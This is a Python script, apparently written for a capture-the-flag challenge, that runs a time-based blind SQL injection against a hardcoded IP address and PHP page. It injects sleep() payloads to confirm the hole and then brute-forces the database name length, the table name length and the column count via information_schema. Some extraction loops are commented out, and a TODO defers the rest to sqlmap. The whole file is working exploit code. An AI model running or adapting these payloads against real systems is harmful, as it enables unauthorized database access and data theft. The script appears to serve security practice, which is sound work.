#!/usr/bin/python3

import requests
import sys
import string

base_url = 'http://202.121.178.79:40003/error/index.php'


def ask(url, timeout):  # return True if successfuly sleeped
    rst = False
    try:
        r = requests.get(url, timeout=timeout)
        if not r.ok:
            raise Exception('[!] Response is not ok')
        # print(r.content)
    except requests.exceptions.Timeout:
        rst = True
    return rst


# test vulnerability
param = "?id=1' and sleep(5)--+"
vuln = ask(base_url + param, 2)

if vuln:
    print('[+] Target appears to be vulnerable')
else:
    print('[!] Not vulnerable')
    sys.exit(-1)

# get the length of the database name
len_db_name = 1
while True:
    param = "?id=1' and (select sleep(5) from dual where (select length(database())={}) )--+".\
                    format(len_db_name)
    if ask(base_url + param, 2):
        break
    len_db_name += 1
print('[+] Database name has {} chars'.format(len_db_name))

# brute force the database name
db_name = 'ctf'     #TODO: test
# db_name = ''
# for i in range(1, len_db_name + 1):
    # for c in string.ascii_letters:
        # param = "?id=1' and \
                # (select sleep(5) from dual where \
                # (select ascii(substr(database(),{},1))={})\
                # )--+".\
                # format(i, ord(c))
        # if ask(base_url + param, 2):
            # db_name += c
            # break

print('[+] Database name is {}'.format(db_name))

# brute force the length of table name
len_tb_name = 1
param = "?id=1' and \
        (select sleep(5) from dual where \
            (select \
                length(\
                    (select table_name from information_schema.tables where table_schema=database() limit 0, 1)\
                    ) = {}\
            )\
        )--+"
while True:
    if ask(base_url + param.format(len_tb_name), 2):
        break
    len_tb_name += 1
print('[+] Table name has {} chars'.format(len_tb_name))

# brute force the table name
tb_name = 'error'       # TODO: test
# tb_name = ''
# param = "?id=1' and \
        # (select sleep(5) from dual where \
            # (select \
                # ascii(\
                    # substr(\
                        # (select table_name from information_schema.tables where table_schema=database() limit 0, 1)\
                        # , {}, 1\
                        # )\
                    # ) = {}\
            # )\
        # )--+"
# for i in range(1, len_tb_name + 1):
    # for c in string.ascii_letters:
        # if ask(base_url + param.format(i, ord(c)), 2):
            # tb_name += c
            # break
print('[+] Table name is {}'.format(tb_name))

# brute force number of columns
len_cols = 1
param = "?id=1' and \
        (select sleep(5) from dual where \
            (select \
                (select COUNT(column_name) from information_schema.columns where table_name='" + tb_name + "'" + \
                ")\
                = {}\
            )\
        )--+"
while True:
    if ask(base_url + param.format(len_cols), 2):
        break
    len_cols += 1
print('[+] There are {} columns in table {}'.format(len_cols, tb_name))

# brute force each column names
# TODO: so tedious, use sqlmap
